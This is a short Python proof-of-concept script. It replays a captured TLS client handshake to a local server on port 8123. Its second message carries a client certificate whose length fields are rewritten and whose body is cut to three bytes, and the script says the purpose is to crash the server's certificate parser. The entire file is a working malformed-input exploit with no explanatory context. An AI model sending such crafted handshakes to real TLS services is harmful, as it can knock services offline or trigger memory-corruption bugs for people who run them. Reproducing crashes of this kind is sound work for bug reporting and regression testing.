#!/usr/bin/env python3
import sys
import socket

handshake_length = b'\x05\xeb'
handshake_prot_cert_length = b'\x00\x05\xe7'
certificates_length = b'\x00\x05\xe4'
certificate_length = b'\x00\x05\xe1'
cert_content = bytes.fromhex('308205dd308203c5a003020102021479ff090c271bdb34cef74df63426706d62ed2734300d06092a864886f70d01010b0500307e310b30090603550406130258583114301206035504080c0b636c69656e7473746174653113301106035504070c0a636c69656e746369747931163014060355040a0c0d636c69656e74636f6d70616e7931133011060355040b0c0a636c69656e74617364663117301506035504030c0e636c69656e74686f73746e616d65301e170d3234303532323037313434305a170d3334303532303037313434305a307e310b30090603550406130258583114301206035504080c0b636c69656e7473746174653113301106035504070c0a636c69656e746369747931163014060355040a0c0d636c69656e74636f6d70616e7931133011060355040b0c0a636c69656e74617364663117301506035504030c0e636c69656e74686f73746e616d6530820222300d06092a864886f70d01010105000382020f003082020a0282020100b6045d375dc059ccc0e4f8a0415d228f7eb37817d506bbd1e4ee8c578099318f57f21b8b0af820f1692ee76c5add3f1d979d2694e7454ebd252e41c7124ade2c05f778786b8485bf269791e57123ca9c5e7a8110f80136963fdc272556e058b92832b8674d9570ccb7a6b22f694c04a63f95266e8f72e25b854bbf6dc8b1f1a0fa98491b1bfe157eefb2e63fbf543b58b94fb12c456ff385af2ee0a57f5a4bbb527266dc54b5c6b1f21c22b1d721e0c941b5f6a1ce01a49ef2406596cbc95f54f5066d856441b001b6b92ba0c7ff77226828a7488538a909fc0408fc95d9cd9e67c6531acbda887c7e57881e964e13bd10f802ad55ed53bce86ff1bdc70c811480763bab2848fb51bf1f9528e8b7cc03a435af4834b7c365054ed09f46964e16a3c28411791522dee2933cc94129333e8dc2e44345b5949d5cb7884e06251c26dc816b989a3b2ed5030754d245b8a3266781ed3974c63703ac8a9db4180f247b1b4e35a9ef25ca08884ef02764cd38e50727dbd5de1c78bcf94fa077519467b3c50787e1a05e977a281d2a676caea96c6291ec535cea0e872044c522e2ca6b32872f8c45b1cf507984d9d9ae7f650530b2bac52b0044506762c71c8bf58cbcdf41bffe9ff6fcb80d9976c94b12cff6fdf070505d87b80dd004913ba29339ef78aef92800621b7f8c4cc5dc31280eda0d75ee1c0953fbe9da1aea7803aeeb32d10203010001a3533051301d0603551d0e041604149ff6e1a268094cf0625af3d00ab33e6cdb7696ed301f0603551d230418301680149ff6e1a268094cf0625af3d00ab33e6cdb7696ed300f0603551d130101ff040530030101ff300d06092a864886f70d01010b050003820201006b1b641570480485119a7823aae6d8a5d16dfaec0835d185fb79b1ac31c5f436f2e0e32f91bd1dc74ee3faf247362736c6f3484a9fbd0c850c4bc4ec372478d356388594f63df85dcabec2f33a866ecad7a5d4bbb308769d27d6a874cbc8211a5eb57fafe5b2b8b7ff4fa4e00acaab5349109862a0f0f629439f05e7b2bcf94f29f190da499741aef1eae330d1a9b94255ee9d8f29e5b3a5917f2f8fecd5b6a5f1af97b8e9b25ba4a1aa08da96cb853f5678751d39d02dd0d0eef31731ab1304a4aeb9bd222a51f0b9b1e395e61f76f32cc2bb4fdeec61fe2c14f50511845426361307be49cd33fd9fc34f07ddb363826c025f5b9e3ad7d683579fdb4b1bf53ca979cee97cb495d058b1140651da19d375ff1e0bd9b67bcefc8c0b947047f39161302bd4099272445edf1ce5b7561cd7bd0f32418332efe06c6257124a6c184f50f720b3069fa985f01ccd0a8744780e1703549e03d2de21f626c54fedd0badfcd021f800d94adad4fedcfd019261842a15d1d95caa9e09d6e88f7dc63f6706388153fd158b5ef4a570037f2674423a703b35b63ebc9402b971ce89138aa6481e91321f3115420701e861d3c62ca37263f5788ea2f508e48c8bcf4efe9ab586594f5413dbe1318f0b6b86c92c1221943afbc2a61544e1975c5e7022381317ea732d3a9511662bae617fa8b211dbbc51eb45d57f019bddfff0b664a62742afeba')

p1 = bytes.fromhex('1603010124010001200303afa40eef95cce58579114a1d821481f5352cc41948ab1ae2860e4e7fad84e86320cfeaadc4357405d2ca6355affe80df7d24b295381ca277ec6ebeaaa808b18d9b003e130213031301c02cc030009fcca9cca8ccaac02bc02f009ec024c028006bc023c0270067c00ac0140039c009c0130033009d009c003d003c0035002f00ff01000099000b000403000102000a00160014001d0017001e0019001801000101010201030104002300000016000000170000000d002a0028040305030603080708080809080a080b080408050806040105010601030303010302040205020602002b0009080304030303020301002d00020101003300260024001d0020e705f7c2ddbbccb48845e55b1bc716add50138135293aa3ee97e445e6615a012')
p2 = bytes.fromhex('16030305eb0b0005e70005e40005e1308205dd308203c5a003020102021479ff090c271bdb34cef74df63426706d62ed2734300d06092a864886f70d01010b0500307e310b30090603550406130258583114301206035504080c0b636c69656e7473746174653113301106035504070c0a636c69656e746369747931163014060355040a0c0d636c69656e74636f6d70616e7931133011060355040b0c0a636c69656e74617364663117301506035504030c0e636c69656e74686f73746e616d65301e170d3234303532323037313434305a170d3334303532303037313434305a307e310b30090603550406130258583114301206035504080c0b636c69656e7473746174653113301106035504070c0a636c69656e746369747931163014060355040a0c0d636c69656e74636f6d70616e7931133011060355040b0c0a636c69656e74617364663117301506035504030c0e636c69656e74686f73746e616d6530820222300d06092a864886f70d01010105000382020f003082020a0282020100b6045d375dc059ccc0e4f8a0415d228f7eb37817d506bbd1e4ee8c578099318f57f21b8b0af820f1692ee76c5add3f1d979d2694e7454ebd252e41c7124ade2c05f778786b8485bf269791e57123ca9c5e7a8110f80136963fdc272556e058b92832b8674d9570ccb7a6b22f694c04a63f95266e8f72e25b854bbf6dc8b1f1a0fa98491b1bfe157eefb2e63fbf543b58b94fb12c456ff385af2ee0a57f5a4bbb527266dc54b5c6b1f21c22b1d721e0c941b5f6a1ce01a49ef2406596cbc95f54f5066d856441b001b6b92ba0c7ff77226828a7488538a909fc0408fc95d9cd9e67c6531acbda887c7e57881e964e13bd10f802ad55ed53bce86ff1bdc70c811480763bab2848fb51bf1f9528e8b7cc03a435af4834b7c365054ed09f46964e16a3c28411791522dee2933cc94129333e8dc2e44345b5949d5cb7884e06251c26dc816b989a3b2ed5030754d245b8a3266781ed3974c63703ac8a9db4180f247b1b4e35a9ef25ca08884ef02764cd38e50727dbd5de1c78bcf94fa077519467b3c50787e1a05e977a281d2a676caea96c6291ec535cea0e872044c522e2ca6b32872f8c45b1cf507984d9d9ae7f650530b2bac52b0044506762c71c8bf58cbcdf41bffe9ff6fcb80d9976c94b12cff6fdf070505d87b80dd004913ba29339ef78aef92800621b7f8c4cc5dc31280eda0d75ee1c0953fbe9da1aea7803aeeb32d10203010001a3533051301d0603551d0e041604149ff6e1a268094cf0625af3d00ab33e6cdb7696ed301f0603551d230418301680149ff6e1a268094cf0625af3d00ab33e6cdb7696ed300f0603551d130101ff040530030101ff300d06092a864886f70d01010b050003820201006b1b641570480485119a7823aae6d8a5d16dfaec0835d185fb79b1ac31c5f436f2e0e32f91bd1dc74ee3faf247362736c6f3484a9fbd0c850c4bc4ec372478d356388594f63df85dcabec2f33a866ecad7a5d4bbb308769d27d6a874cbc8211a5eb57fafe5b2b8b7ff4fa4e00acaab5349109862a0f0f629439f05e7b2bcf94f29f190da499741aef1eae330d1a9b94255ee9d8f29e5b3a5917f2f8fecd5b6a5f1af97b8e9b25ba4a1aa08da96cb853f5678751d39d02dd0d0eef31731ab1304a4aeb9bd222a51f0b9b1e395e61f76f32cc2bb4fdeec61fe2c14f50511845426361307be49cd33fd9fc34f07ddb363826c025f5b9e3ad7d683579fdb4b1bf53ca979cee97cb495d058b1140651da19d375ff1e0bd9b67bcefc8c0b947047f39161302bd4099272445edf1ce5b7561cd7bd0f32418332efe06c6257124a6c184f50f720b3069fa985f01ccd0a8744780e1703549e03d2de21f626c54fedd0badfcd021f800d94adad4fedcfd019261842a15d1d95caa9e09d6e88f7dc63f6706388153fd158b5ef4a570037f2674423a703b35b63ebc9402b971ce89138aa6481e91321f3115420701e861d3c62ca37263f5788ea2f508e48c8bcf4efe9ab586594f5413dbe1318f0b6b86c92c1221943afbc2a61544e1975c5e7022381317ea732d3a9511662bae617fa8b211dbbc51eb45d57f019bddfff0b664a62742afeba16030300461000004241041592b5c5d8021374ab598c84984140697fcecf3f6725009e5f85619849fc2fe00fb8d65fe33a3bece33baf6e72df2f08d0d2cbf6314c7bf211f2b8550105ef9816030302080f0002040401020074b5c24055872f3fa8764fe56674ffb31517b2ae55818ff27cb5f12581f50361e13cca2070d23b9e03d8bf0e0909a3c97734ddfd6eafdd986cd3aeacf40df5f78febe8185b4eb7cf01da8f197dfbefef8d0ea8ad373c52e61694f4a45e3b7dadef91940ef4866fc8c7e5d428e2fd4c06a42f99edf2ef48dcdf67865730df3de2557771cf749ab5481b2d14097edf4d847f237010cdd31ae15e7835b78b8b2ddce8bc00afc8deaa4ac7ebed146ca7805ac1af460984fb995b919168e58c0250aec2185b124c342b830b10dc547cdc6dcd9e279e3d2c09ff77fb7fc39285c55de9506d26cc6233b715eed4cd2ef535ee2385992184200e56bbd2ef5b8e1d034e562efaeca151f5c49d752043638cb51dd9b93244c3d4e3452360fbe2741aed8756410069f55b7f0d67dd8b7da1fd7f52757aae86fc72b85e4215ec54edc6aa720e5a22a9f20b5f66796875c4484f5279a74e819718f71ed171043b5919534034e52e905c41bcd39e63c61c0bfb29c55d60737e7d0311c6eae8cbee325c8e3368924a96444e2825a9cfbd24ab90f60a5dec2f69829a45fc6959d34c5f7d3d74dd622b1466a41c16a774db1fbfb84643cf575d087076b1d5694665b503ae9e85f5b0fad1d4c4148ab4db2212cd429c0ca947560eb51a2fbcc0d92f7092df2ea90126d6866f0cb5c7d5b077cec90df350682da24c761eec04e61c3a93f94eb961fe541403030001011603030020bc29c570695e840e493ff8d9466e07d0016f3341739471f62ee6b80ea42b33e3')

p2 = p2.replace(certificate_length, b'\x00\x00\x03')
# + 3
p2 = p2.replace(certificates_length, b'\x00\x00\x07')
# + 3
p2 = p2.replace(handshake_prot_cert_length, b'\x00\x00\x0a')
# + 4
p2 = p2.replace(handshake_length, b'\x00\x0e')

p2 = p2.replace(cert_content, b'\x03\x01\x3f')

s = socket.socket()
s.connect(("127.0.0.1", 8123))
s.send(p1)
print("Sent initial handshake")
ret = s.recv(10000)
s.send(p2)
print("Sent payload to crash certificate parser")
